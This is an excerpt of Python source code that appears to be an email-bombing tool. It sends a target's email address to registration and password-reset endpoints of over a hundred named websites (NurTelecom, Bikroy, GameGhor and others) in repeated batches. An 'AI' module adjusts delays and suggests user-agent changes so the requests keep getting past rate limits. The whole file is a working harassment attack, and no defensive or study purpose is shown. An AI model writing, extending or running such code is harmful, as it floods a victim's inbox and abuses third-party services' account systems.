            return False
    ...
    async def api_email107____nurtelecom_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL107 - NurTelecom Password Reset", success, res.status, api_key="EMAIL107 - NurTelecom Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL107 - NurTelecom Password Reset", False, "Error", api_key="EMAIL107 - NurTelecom Password Reset")
            return False
...
self.api_email52____bikroy_account, self.api_email53____bikroy_password_reset, self.api_email54____busbud_signup, self.api_email55____mithaibd_register, self.api_email56____sara_lifestyle_otp, self.api_email57____tohfay_register, self.api_email58____tohfay_forgot, self.api_email59____mrmedicinemart_signup, self.api_email60____mrmedicinemart_reset, self.api_email61____marhampharmacy_register, self.api_email62____giftinday_register, self.api_email63____giftinday_password_reset, self.api_email64____sentimentsexpress_register, self.api_email65____robishop_create, self.api_email66____robishop_reset, self.api_email67____clickbd_signup, self.api_email68____clickbd_recovery, self.api_email69____diamu_register, self.api_email70____diamu_password_reset, self.api_email71____zymak_register, self.api_email72____zymak_password_reset, self.api_email73____shopz_register, self.api_email74____shopz_password_reset, self.api_email75____xclusivebrands_register, self.api_email76____xclusivebrands_lost_password, self.api_email77____bdmanja_register, self.api_email78____bdmanja_password_reset, self.api_email79____xclusivebrands_register_2, self.api_email80____xclusivebrands_lost_password_2, self.api_email81____gameghor_register, self.api_email82____gameghor_password_reset, self.api_email83____potakait_register, self.api_email84____gamebuybd_register, self.api_email85____gamebuybd_lost_password, self.api_email86____gameforce_register, self.api_email87____gameforce_lost_password, self.api_email88____gamecastlebd_register, self.api_email89____gamecastlebd_lost_password, self.api_email90____techshopbd_signup, self.api_email91____electronics_register, self.api_email92____electronics_recovery, self.api_email93____electronics_bangladesh_otp, self.api_email94____singerbd_otp, self.api_email95____robotechbd_register, self.api_email96____robotechbd_lost_password, self.api_email97____electronicshopbd_register, self.api_email98____electronicshopbd_lost_password, self.api_email99____makersbd_register, self.api_email100____globalbrand_register, self.api_email101____globalbrand_forgot, self.api_email102____orient_electronics_register, self.api_email103____orient_electronics_password_reset, self.api_email104____abe_register, self.api_email105____abe_forget_password, self.api_email106____nurtelecom_register, self.api_email107____nurtelecom_password_reset
        ...
        while self.running and not self.stop_event.is_set():
            ...
            while (asyncio.get_event_loop().time() - batch_start_time) < self.request_batch_duration and self.running and not self.stop_event.is_set():
                ...
                # AI Optimization: Check if request should proceed
                # If AI is disabled, optimize_request will use hardcore logic
                if not self.ai.optimize_request(api.__name__, self.target):
                    await asyncio.sleep(self.ai.get_dynamic_delay()) # Use dynamic delay even for skipped requests
                    continue

                async def run_api(api_func, api_name_str):
                    async with self.semaphore:
                        try:
                            # Apply AI-suggested fixes before making the request
                            fix = self.ai.get_fix_for_api(api_name_str)
                            current_delay = self.ai.get_dynamic_delay()

                            if "increase delay" in fix.lower():
                                current_delay *= 2 # Double the delay
                                self.ai.log_move("APPLY_FIX", f"Increased delay for {api_name_str} to {current_delay:.2f}s")
                            elif "change user-agent" in fix.lower():
                                # User-agent is generated per request in get_headers, so no explicit change needed here
                                # But we can log that AI suggested it.
                                self.ai.log_move("APPLY_FIX", f"AI suggested changing user-agent for {api_name_str}")
                ...
                # Extract API name string for logging and fix application
                parts = api.__name__.split("___")
                api_name_str = f"{parts[0].replace("api_", "").upper()} - {parts[1].replace("_", " ").title()}" if len(parts) > 1 else api.__name__
                asyncio.create_task(run_api(api, api_name_str))
            ...
            if self.running and not self.stop_event.is_set():
                # Log AI move before resting
                if self.ai.enabled:
                    self.ai.log_move("REST", f"Batch completed. Resting for {self.rest_duration}s.")
